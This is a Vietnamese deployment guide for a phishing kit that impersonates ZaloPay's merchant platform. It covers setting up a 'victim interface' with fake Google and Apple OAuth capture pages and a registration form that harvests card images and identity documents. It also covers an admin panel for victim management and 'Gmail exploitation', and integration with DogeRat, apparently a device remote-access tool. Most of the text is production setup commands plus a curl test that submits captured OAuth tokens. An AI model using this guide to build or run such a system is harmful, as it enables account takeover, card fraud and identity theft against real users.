# ZaloPay Merchant Platform - Hướng Dẫn Triển Khai Thực Tế

**Phiên bản:** 1.0.0  
**Ngày cập nhật:** January 2025  
**Mục đích:** Hướng dẫn chi tiết từng bước để triển khai toàn bộ hệ thống ZaloPay Merchant Platform trong môi trường thực tế

---

## Mục Lục

1. [Tổng Quan Dự Án](#tổng-quan-dự-án)
2. [Yêu Cầu Hệ Thống](#yêu-cầu-hệ-thống)
3. [Chuẩn Bị Môi Trường](#chuẩn-bị-môi-trường)
4. [Cài Đặt Dependencies](#cài-đặt-dependencies)
5. [Cấu Hình Database](#cấu-hình-database)
6. [Cấu Hình Môi Trường](#cấu-hình-môi-trường)
7. [Build Frontend](#build-frontend)
8. [Khởi Động Backend](#khởi-động-backend)
9. [Kiểm Tra và Xác Minh](#kiểm-tra-và-xác-minh)
10. [Triển Khai Production](#triển-khai-production)
11. [Bảo Trì và Monitoring](#bảo-trì-và-monitoring)
12. [Troubleshooting](#troubleshooting)

---

## Tổng Quan Dự Án

### Kiến Trúc Hệ Thống

ZaloPay Merchant Platform là một hệ thống tích hợp gồm 3 thành phần chính:

1. **Frontend Victim Interface** (`static/merchant/`)
   - HTML5/CSS3/JavaScript
   - OAuth capture (Google, Apple)
   - Registration form với 7 steps
   - PWA support

2. **Admin Control Center** (`static/admin/`)
   - React 18.2.0 + TypeScript
   - Vite build tool
   - Real-time dashboard
   - Victim management
   - Gmail exploitation
   - Device management (DogeRat API)

3. **Backend API** (`backend/`)
   - Node.js + Express.js
   - Socket.IO cho real-time communication
   - PostgreSQL với Prisma ORM
   - REST API endpoints
   - DogeRat API integration

### Cấu Trúc Thư Mục

```
zalo-pay-2/
├── backend/                    # Backend API server
│   ├── config/                 # Configuration files
│   ├── middleware/             # Express middleware
│   ├── repositories/           # Data access layer
│   ├── routes/                 # API routes
│   │   ├── api/
│   │   │   ├── admin/          # Admin API routes
│   │   │   ├── capture/        # OAuth capture routes
│   │   │   ├── merchant/       # Merchant registration routes
│   │   │   └── v1/             # DogeRat API v1 routes
│   ├── services/               # Business logic
│   ├── sockets/                # Socket.IO handlers
│   ├── prisma/                 # Prisma schema và migrations
│   │   ├── schema.prisma       # Database schema
│   │   └── seed.js             # Seed script
│   ├── storage/                 # File storage
│   │   ├── identity/           # Identity verification files
│   │   ├── documents/          # Business documents
│   │   └── exports/            # Data exports
│   └── server.js               # Main server entry point
├── static/
│   ├── admin/                  # Admin React frontend
│   │   ├── src/                # React source code
│   │   ├── public/              # Public assets
│   │   │   ├── manifest.json   # PWA manifest
│   │   │   └── sw.js           # Service Worker
│   │   └── dist/               # Build output
│   └── merchant/                # Merchant victim interface
│       ├── index.html          # Landing page
│       ├── google_auth.html    # Google OAuth capture
│       ├── apple_auth.html     # Apple OAuth capture
│       ├── register.html       # Registration form
│       └── js/                 # JavaScript files
├── Docs/                        # Documentation
└── Deployment/                  # Deployment guides
    └── DEPLOYMENT_GUIDE.md     # This file
```

---

## Yêu Cầu Hệ Thống

### Phần Cứng Tối Thiểu

- **CPU**: 2 cores (4 cores recommended)
- **RAM**: 4GB (8GB recommended)
- **Storage**: 20GB (50GB recommended)
- **Network**: Stable internet connection

### Phần Mềm Yêu Cầu

#### Backend Requirements

- **Node.js**: v18.0.0 hoặc cao hơn
- **npm**: v9.0.0 hoặc cao hơn
- **PostgreSQL**: v14.0 hoặc cao hơn
- **Git**: Latest version

#### Frontend Requirements

- **Node.js**: v18.0.0 hoặc cao hơn (cho admin frontend build)
- **npm**: v9.0.0 hoặc cao hơn

#### Development Tools (Optional)

- **Postman** hoặc **Insomnia**: Để test API
- **pgAdmin** hoặc **DBeaver**: Để quản lý database
- **VS Code** hoặc **WebStorm**: IDE

### Kiểm Tra Yêu Cầu

```bash
# Kiểm tra Node.js version
node --version
# Kết quả mong đợi: v18.x.x hoặc cao hơn

# Kiểm tra npm version
npm --version
# Kết quả mong đợi: v9.x.x hoặc cao hơn

# Kiểm tra PostgreSQL version
psql --version
# Kết quả mong đợi: PostgreSQL 14.x hoặc cao hơn

# Kiểm tra Git version
git --version
# Kết quả mong đợi: git version 2.x.x hoặc cao hơn
```

---

## Chuẩn Bị Môi Trường

### 1. Clone Repository

```bash
# Clone repository (nếu chưa có)
git clone <repository-url>
cd zalo-pay-2

# Hoặc nếu đã có code, đảm bảo đang ở thư mục gốc
pwd
# Kết quả mong đợi: /path/to/zalo-pay-2
```

### 2. Tạo Thư Mục Storage

```bash
# Tạo thư mục storage cho file uploads
mkdir -p backend/storage/identity/card_images
mkdir -p backend/storage/identity/transaction_history
mkdir -p backend/storage/documents/business_licenses
mkdir -p backend/storage/documents/representative_ids
mkdir -p backend/storage/documents/business_location_photos
mkdir -p backend/storage/exports/gmail_data
mkdir -p backend/storage/exports/reports

# Set permissions (Linux/Mac)
chmod -R 755 backend/storage
```

### 3. Tạo Thư Mục Logs

```bash
# Tạo thư mục logs
mkdir -p backend/logs

# Set permissions
chmod -R 755 backend/logs
```

---

## Cài Đặt Dependencies

### 1. Cài Đặt Backend Dependencies

```bash
# Di chuyển vào thư mục backend
cd backend

# Cài đặt dependencies
npm install

# Kiểm tra cài đặt thành công
npm list --depth=0
# Kết quả: Hiển thị danh sách packages đã cài đặt
```

**Thời gian ước tính:** 2-5 phút

**Lưu ý:** Nếu gặp lỗi với `node-gyp` hoặc native modules, cài đặt build tools:

```bash
# Ubuntu/Debian
sudo apt-get install build-essential

# macOS
xcode-select --install

# Windows
# Cài đặt Visual Studio Build Tools
```

### 2. Cài Đặt Admin Frontend Dependencies

```bash
# Di chuyển vào thư mục admin frontend
cd ../static/admin

# Cài đặt dependencies
npm install

# Kiểm tra cài đặt thành công
npm list --depth=0
```

**Thời gian ước tính:** 3-7 phút

### 3. Verify Dependencies

```bash
# Quay lại thư mục gốc
cd ../..

# Kiểm tra backend dependencies
cd backend
npm audit
# Nếu có vulnerabilities, chạy: npm audit fix

# Kiểm tra admin frontend dependencies
cd ../static/admin
npm audit
```

---

## Cấu Hình Database

### 1. Tạo PostgreSQL Database

#### Option A: Sử dụng psql Command Line

```bash
# Kết nối đến PostgreSQL
psql -U postgres

# Tạo database
CREATE DATABASE zalopay_merchant;

# Tạo user (optional, nếu muốn dùng user riêng)
CREATE USER zalopay_user WITH PASSWORD 'your_secure_password';

# Cấp quyền
GRANT ALL PRIVILEGES ON DATABASE zalopay_merchant TO zalopay_user;

# Thoát psql
\q
```

#### Option B: Sử dụng pgAdmin

1. Mở pgAdmin
2. Kết nối đến PostgreSQL server
3. Right-click vào "Databases" → "Create" → "Database"
4. Đặt tên: `zalopay_merchant`
5. Click "Save"

### 2. Chạy Database Migrations

#### Option A: Sử dụng Prisma (Recommended)

```bash
# Di chuyển vào thư mục backend
cd backend

# Generate Prisma Client
npm run db:generate

# Chạy migrations
npm run db:migrate

# Seed initial data (admin user và default campaign)
npm run db:seed
```

**Kết quả mong đợi:**
```
✔ Generated Prisma Client
✔ Applied migration
✔ Seeded database successfully
```

#### Option B: Sử dụng SQL Files (Manual)

```bash
# Kết nối đến database
psql -U postgres -d zalopay_merchant

# Chạy migration files theo thứ tự
\i backend/migrations/001_create_tables.sql
\i backend/migrations/002_add_platform_support.sql

# Thoát psql
\q
```

### 3. Verify Database Setup

```bash
# Kết nối đến database
psql -U postgres -d zalopay_merchant

# Kiểm tra tables đã được tạo
\dt

# Kết quả mong đợi: Hiển thị các tables:
# - victims
# - oauth_tokens
# - admin_users
# - campaigns
# - activity_logs
# - gmail_access_logs
# - devices
# - device_data

# Kiểm tra admin user đã được tạo
SELECT username, email, role FROM admin_users;

# Kết quả mong đợi:
# username | email                    | role
# ---------+--------------------------+---------------
# admin    | admin@zalopay.local      | super_admin

# Thoát psql
\q
```

---

## Cấu Hình Môi Trường

### 1. Tạo File .env

```bash
# Di chuyển vào thư mục backend
cd backend

# Tạo file .env từ template (nếu có)
cp .env.example .env

# Hoặc tạo file .env mới
touch .env
```

### 2. Cấu Hình Environment Variables

Mở file `backend/.env` và cấu hình các biến sau:

```env
# ============================================
# SERVER CONFIGURATION
# ============================================
NODE_ENV=development
PORT=3000

# ============================================
# DATABASE CONFIGURATION
# ============================================
# Format: postgresql://user:password@host:port/database
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/zalopay_merchant

# ============================================
# SECURITY CONFIGURATION
# ============================================
# JWT Secret - Generate với: openssl rand -hex 32
JWT_SECRET=your-super-secret-jwt-key-change-this-in-production-min-32-chars
JWT_EXPIRES_IN=24h
BCRYPT_ROUNDS=10

# ============================================
# ENCRYPTION KEYS (AES-256-GCM)
# ============================================
# Generate với: openssl rand -hex 32
CARD_ENCRYPTION_KEY=your-64-character-hex-encryption-key-for-card-data
OAUTH_ENCRYPTION_KEY=your-64-character-hex-encryption-key-for-oauth-tokens

# ============================================
# CORS CONFIGURATION
# ============================================
CORS_ORIGIN=http://localhost:3000

# ============================================
# GOOGLE OAUTH (for Gmail Exploitation)
# ============================================
GOOGLE_CLIENT_ID=your-google-client-id
GOOGLE_CLIENT_SECRET=your-google-client-secret
GOOGLE_REDIRECT_URI=http://localhost:3000/api/admin/gmail/callback

# ============================================
# FILE STORAGE CONFIGURATION
# ============================================
STORAGE_BASE_PATH=./storage
STORAGE_IDENTITY_PATH=./storage/identity
STORAGE_DOCUMENTS_PATH=./storage/documents
STORAGE_EXPORTS_PATH=./storage/exports
MAX_FILE_SIZE=16777216

# ============================================
# LOGGING CONFIGURATION
# ============================================
LOG_LEVEL=info
LOG_FILE_PATH=./logs/app.log
ERROR_LOG_FILE_PATH=./logs/error.log
```

### 3. Generate Encryption Keys

```bash
# Generate JWT Secret
openssl rand -hex 32

# Generate Card Encryption Key
openssl rand -hex 32

# Generate OAuth Encryption Key
openssl rand -hex 32
```

**Lưu ý:** Copy các keys đã generate vào file `.env` tương ứng.

### 4. Verify Environment Configuration

```bash
# Kiểm tra file .env đã được tạo
ls -la backend/.env

# Kiểm tra các biến môi trường quan trọng (không hiển thị giá trị)
cd backend
node -e "require('dotenv').config(); console.log('DATABASE_URL:', process.env.DATABASE_URL ? 'SET' : 'NOT SET'); console.log('JWT_SECRET:', process.env.JWT_SECRET ? 'SET' : 'NOT SET');"
```

---

## Build Frontend

### 1. Build Admin Frontend

```bash
# Di chuyển vào thư mục admin frontend
cd static/admin

# Build production version
npm run build

# Kết quả mong đợi:
# ✓ built in X.XXs
# dist/index.html                    X.XX kB
# dist/assets/index-XXXXX.js         XXX.XX kB
# dist/assets/index-XXXXX.css        XX.XX kB
```

**Thời gian ước tính:** 30-60 giây

### 2. Verify Build Output

```bash
# Kiểm tra thư mục dist đã được tạo
ls -la dist/

# Kết quả mong đợi:
# - index.html
# - assets/ (chứa các file JS và CSS đã build)
```

### 3. Configure Admin Frontend Environment (Optional)

Nếu admin frontend cần environment variables:

```bash
# Tạo file .env trong static/admin/
cd static/admin
touch .env

# Thêm các biến cần thiết (ví dụ: API URL)
echo "VITE_API_URL=http://localhost:3000" >> .env
```

**Lưu ý:** Vite sử dụng prefix `VITE_` cho environment variables.

---

## Khởi Động Backend

### 1. Development Mode

```bash
# Di chuyển vào thư mục backend
cd backend

# Khởi động server ở development mode (với auto-reload)
npm run dev

# Kết quả mong đợi:
# Server running on port 3000
# Database connected successfully
# Socket.IO initialized
# Prisma Client generated
```

**Lưu ý:** Development mode sử dụng `nodemon` để tự động restart khi có thay đổi code.

### 2. Production Mode

```bash
# Di chuyển vào thư mục backend
cd backend

# Khởi động server ở production mode
NODE_ENV=production npm start

# Hoặc sử dụng PM2 (recommended cho production)
pm2 start server.js --name zalopay-backend
```

### 3. Verify Server Running

Mở browser và truy cập:

- **Health Check**: `http://localhost:3000/health`
- **API Docs**: `http://localhost:3000/api-docs` (nếu Swagger được enable)
- **Admin Portal**: `http://localhost:3000/admin`

**Kết quả mong đợi:**
- Health check trả về: `{"status":"ok"}`
- API docs hiển thị Swagger UI
- Admin portal hiển thị login page

---

## Kiểm Tra và Xác Minh

### 1. Kiểm Tra Database Connection

```bash
# Chạy test database connection
cd backend
node -e "
const { PrismaClient } = require('@prisma/client');
const prisma = new PrismaClient();
prisma.\$connect()
  .then(() => {
    console.log('✓ Database connection successful');
    return prisma.\$disconnect();
  })
  .catch((error) => {
    console.error('✗ Database connection failed:', error);
    process.exit(1);
  });
"
```

### 2. Kiểm Tra API Endpoints

#### Test Health Check Endpoint

```bash
curl http://localhost:3000/health

# Kết quả mong đợi:
# {"status":"ok","timestamp":"2025-01-XX..."}
```

#### Test Admin Login Endpoint

```bash
curl -X POST http://localhost:3000/api/admin/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "admin123"
  }'

# Kết quả mong đợi:
# {"success":true,"token":"eyJhbGciOiJIUzI1NiIs..."}
```

#### Test OAuth Capture Endpoint

```bash
curl -X POST http://localhost:3000/api/capture/oauth \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "google",
    "email": "test@example.com",
    "tokens": {
      "access_token": "test_token",
      "refresh_token": "test_refresh"
    },
    "profile": {
      "email": "test@example.com",
      "name": "Test User"
    }
  }'

# Kết quả mong đợi:
# {"success":true,"victim_id":"uuid-here"}
```

### 3. Kiểm Tra Socket.IO Connection

Mở browser console và chạy:

```javascript
// Test Socket.IO connection
const socket = io('http://localhost:3000');

socket.on('connect', () => {
  console.log('✓ Socket.IO connected:', socket.id);
});

socket.on('disconnect', () => {
  console.log('✗ Socket.IO disconnected');
});
```

### 4. Kiểm Tra Frontend Pages

Mở browser và truy cập các trang sau:

- **Landing Page**: `http://localhost:3000/merchant/`
- **OAuth Google**: `http://localhost:3000/merchant/google_auth.html`
- **OAuth Apple**: `http://localhost:3000/merchant/apple_auth.html`
- **Registration**: `http://localhost:3000/merchant/register.html`
- **Admin Portal**: `http://localhost:3000/admin`

**Kết quả mong đợi:** Tất cả các trang load thành công, không có lỗi JavaScript.

### 5. Kiểm Tra File Upload

```bash
# Test file upload endpoint
curl -X POST http://localhost:3000/api/merchant/register \
  -F "victim_id=test-id" \
  -F "business_name=Test Business" \
  -F "card_image=@/path/to/test-image.jpg"

# Kết quả mong đợi:
# {"success":true,"message":"Registration completed"}
```

---

## Triển Khai Production

### 1. Chuẩn Bị Production Environment

#### Update Environment Variables

```bash
# Cập nhật file .env với production values
cd backend
cp .env .env.production

# Chỉnh sửa .env.production với:
# - NODE_ENV=production
# - DATABASE_URL=production_database_url
# - JWT_SECRET=strong_production_secret
# - CORS_ORIGIN=https://your-domain.com
```

#### Generate Production Encryption Keys

```bash
# Generate production encryption keys
openssl rand -hex 32 > production_card_key.txt
openssl rand -hex 32 > production_oauth_key.txt

# Lưu keys vào secure location (không commit vào git)
# Thêm vào .env.production
```

### 2. Build Production Frontend

```bash
# Build admin frontend với production mode
cd static/admin
npm run build

# Verify build output
ls -la dist/
```

### 3. Database Production Setup

```bash
# Chạy migrations trên production database
cd backend
NODE_ENV=production npm run db:migrate

# Seed production data (nếu cần)
NODE_ENV=production npm run db:seed
```

### 4. Setup Process Manager (PM2)

```bash
# Cài đặt PM2 globally
npm install -g pm2

# Tạo PM2 ecosystem file
cat > backend/ecosystem.config.js << EOF
module.exports = {
  apps: [{
    name: 'zalopay-backend',
    script: './server.js',
    instances: 2,
    exec_mode: 'cluster',
    env: {
      NODE_ENV: 'production',
      PORT: 3000
    },
    error_file: './logs/pm2-error.log',
    out_file: './logs/pm2-out.log',
    log_date_format: 'YYYY-MM-DD HH:mm:ss Z',
    merge_logs: true,
    autorestart: true,
    max_memory_restart: '1G'
  }]
};
EOF

# Start application với PM2
cd backend
pm2 start ecosystem.config.js

# Save PM2 configuration
pm2 save

# Setup PM2 startup script
pm2 startup
```

### 5. Setup Reverse Proxy (Nginx)

```nginx
# /etc/nginx/sites-available/zalopay-merchant
server {
    listen 80;
    server_name your-domain.com;

    # Redirect HTTP to HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name your-domain.com;

    # SSL Configuration
    ssl_certificate /path/to/ssl/cert.pem;
    ssl_certificate_key /path/to/ssl/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Proxy to Node.js application
    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }

    # Static files
    location /static/ {
        alias /path/to/zalo-pay-2/static/;
        expires 30d;
        add_header Cache-Control "public, immutable";
    }
}
```

```bash
# Enable site
sudo ln -s /etc/nginx/sites-available/zalopay-merchant /etc/nginx/sites-enabled/

# Test Nginx configuration
sudo nginx -t

# Reload Nginx
sudo systemctl reload nginx
```

### 6. Setup SSL Certificate (Let's Encrypt)

```bash
# Cài đặt Certbot
sudo apt-get install certbot python3-certbot-nginx

# Obtain SSL certificate
sudo certbot --nginx -d your-domain.com

# Auto-renewal setup
sudo certbot renew --dry-run
```

### 7. Setup Firewall

```bash
# Allow HTTP and HTTPS
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Allow SSH (nếu cần)
sudo ufw allow 22/tcp

# Enable firewall
sudo ufw enable

# Check firewall status
sudo ufw status
```

### 8. Setup Database Backups

```bash
# Tạo backup script
cat > backend/scripts/backup-db.sh << 'EOF'
#!/bin/bash
BACKUP_DIR="/path/to/backups"
DATE=$(date +%Y%m%d_%H%M%S)
DB_NAME="zalopay_merchant"
DB_USER="postgres"

mkdir -p $BACKUP_DIR

pg_dump -U $DB_USER -d $DB_NAME -F c -f $BACKUP_DIR/backup_$DATE.dump

# Keep only last 7 days of backups
find $BACKUP_DIR -name "backup_*.dump" -mtime +7 -delete
EOF

chmod +x backend/scripts/backup-db.sh

# Setup cron job (daily backup at 2 AM)
crontab -e
# Thêm dòng:
# 0 2 * * * /path/to/backend/scripts/backup-db.sh
```

---

## Bảo Trì và Monitoring

### 1. Log Monitoring

```bash
# Xem application logs
tail -f backend/logs/app.log

# Xem error logs
tail -f backend/logs/error.log

# Xem PM2 logs
pm2 logs zalopay-backend
```

### 2. Database Monitoring

```bash
# Kiểm tra database size
psql -U postgres -d zalopay_merchant -c "
SELECT 
    pg_size_pretty(pg_database_size('zalopay_merchant')) AS database_size;
"

# Kiểm tra table sizes
psql -U postgres -d zalopay_merchant -c "
SELECT 
    schemaname,
    tablename,
    pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) AS size
FROM pg_tables
WHERE schemaname = 'public'
ORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC;
"

# Kiểm tra connection count
psql -U postgres -d zalopay_merchant -c "
SELECT count(*) FROM pg_stat_activity WHERE datname = 'zalopay_merchant';
"
```

### 3. Performance Monitoring

```bash
# Monitor PM2 processes
pm2 monit

# Check system resources
htop

# Check disk usage
df -h

# Check memory usage
free -h
```

### 4. Health Checks

```bash
# Automated health check script
cat > backend/scripts/health-check.sh << 'EOF'
#!/bin/bash
HEALTH_URL="http://localhost:3000/health"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" $HEALTH_URL)

if [ $RESPONSE -eq 200 ]; then
    echo "✓ Health check passed"
    exit 0
else
    echo "✗ Health check failed: HTTP $RESPONSE"
    # Restart application
    pm2 restart zalopay-backend
    exit 1
fi
EOF

chmod +x backend/scripts/health-check.sh

# Setup cron job (check every 5 minutes)
crontab -e
# Thêm dòng:
# */5 * * * * /path/to/backend/scripts/health-check.sh
```

---

## Troubleshooting

### 1. Database Connection Issues

**Lỗi:** `Error: P1001: Can't reach database server`

**Giải pháp:**
```bash
# Kiểm tra PostgreSQL đang chạy
sudo systemctl status postgresql

# Khởi động PostgreSQL nếu chưa chạy
sudo systemctl start postgresql

# Kiểm tra DATABASE_URL trong .env
cat backend/.env | grep DATABASE_URL

# Test connection
psql -U postgres -d zalopay_merchant -c "SELECT 1;"
```

### 2. Port Already in Use

**Lỗi:** `Error: listen EADDRINUSE: address already in use :::3000`

**Giải pháp:**
```bash
# Tìm process đang sử dụng port 3000
lsof -i :3000

# Kill process
kill -9 <PID>

# Hoặc thay đổi PORT trong .env
# PORT=3001
```

### 3. Prisma Client Not Generated

**Lỗi:** `Error: Cannot find module '@prisma/client'`

**Giải pháp:**
```bash
cd backend
npm run db:generate
```

### 4. Migration Errors

**Lỗi:** `Error: Migration failed`

**Giải pháp:**
```bash
# Reset database (WARNING: Xóa tất cả dữ liệu)
cd backend
npm run db:reset

# Hoặc rollback migration
npx prisma migrate resolve --rolled-back <migration_name>
```

### 5. File Upload Issues

**Lỗi:** `Error: EACCES: permission denied`

**Giải pháp:**
```bash
# Set permissions cho storage directory
chmod -R 755 backend/storage

# Hoặc change ownership
sudo chown -R $USER:$USER backend/storage
```

### 6. Socket.IO Connection Issues

**Lỗi:** `WebSocket connection failed`

**Giải pháp:**
```bash
# Kiểm tra CORS configuration
cat backend/.env | grep CORS_ORIGIN

# Kiểm tra Socket.IO server đang chạy
# Xem logs: pm2 logs zalopay-backend

# Verify Socket.IO namespace
curl http://localhost:3000/socket.io/
```

### 7. Frontend Build Errors

**Lỗi:** `Build failed with errors`

**Giải pháp:**
```bash
# Clear node_modules và reinstall
cd static/admin
rm -rf node_modules package-lock.json
npm install

# Clear build cache
rm -rf dist .vite

# Rebuild
npm run build
```

### 8. Memory Issues

**Lỗi:** `JavaScript heap out of memory`

**Giải pháp:**
```bash
# Tăng Node.js memory limit
export NODE_OPTIONS="--max-old-space-size=4096"

# Hoặc trong PM2 ecosystem.config.js
# node_args: '--max-old-space-size=4096'
```

---

## Checklist Triển Khai

### Pre-Deployment Checklist

- [ ] Đã cài đặt Node.js 18+
- [ ] Đã cài đặt PostgreSQL 14+
- [ ] Đã clone repository
- [ ] Đã tạo thư mục storage
- [ ] Đã tạo database
- [ ] Đã cấu hình .env file
- [ ] Đã generate encryption keys
- [ ] Đã cài đặt dependencies (backend)
- [ ] Đã cài đặt dependencies (admin frontend)
- [ ] Đã chạy database migrations
- [ ] Đã seed initial data
- [ ] Đã build admin frontend

### Deployment Checklist

- [ ] Đã test database connection
- [ ] Đã test API endpoints
- [ ] Đã test Socket.IO connection
- [ ] Đã test frontend pages
- [ ] Đã test file upload
- [ ] Đã cấu hình production environment
- [ ] Đã setup PM2
- [ ] Đã setup Nginx reverse proxy
- [ ] Đã setup SSL certificate
- [ ] Đã setup firewall
- [ ] Đã setup database backups
- [ ] Đã setup monitoring

### Post-Deployment Checklist

- [ ] Đã verify health check endpoint
- [ ] Đã verify admin login
- [ ] Đã verify OAuth capture flow
- [ ] Đã verify registration form
- [ ] Đã verify file upload
- [ ] Đã verify Socket.IO real-time updates
- [ ] Đã setup log monitoring
- [ ] Đã setup performance monitoring
- [ ] Đã document deployment process

---

## Tài Liệu Tham Khảo

### Internal Documentation

- `Docs/SETUP_GUIDE.md` - Hướng dẫn setup cơ bản
- `Docs/TESTING_GUIDE.md` - Hướng dẫn testing
- `Docs/comprehensive-system-architecture (1).md` - Kiến trúc hệ thống
- `Docs/database-schema-documentation (1).md` - Database schema
- `Docs/ui-flow-documentation.md` - UI flow documentation
- `Docs/system-workflow-documentation (1).md` - System workflow
- `Docs/DOGERAT_API_PWA_INTEGRATION_GUIDE.md` - DogeRat API integration

### External Resources

- [Node.js Documentation](https://nodejs.org/docs/)
- [Express.js Documentation](https://expressjs.com/)
- [Prisma Documentation](https://www.prisma.io/docs)
- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
- [Socket.IO Documentation](https://socket.io/docs/v4)
- [React Documentation](https://react.dev)
- [Vite Documentation](https://vitejs.dev/)

---

## Support và Liên Hệ

Nếu gặp vấn đề trong quá trình triển khai:

1. Kiểm tra logs: `backend/logs/app.log` và `backend/logs/error.log`
2. Xem troubleshooting section ở trên
3. Tham khảo các tài liệu trong thư mục `Docs/`
4. Kiểm tra GitHub issues (nếu có)

---

**Document Version:** 1.0.0  
**Last Updated:** January 2025  
**Author:** ZaloPay Merchant Platform Development Team  
**Status:** Ready for Production Deployment

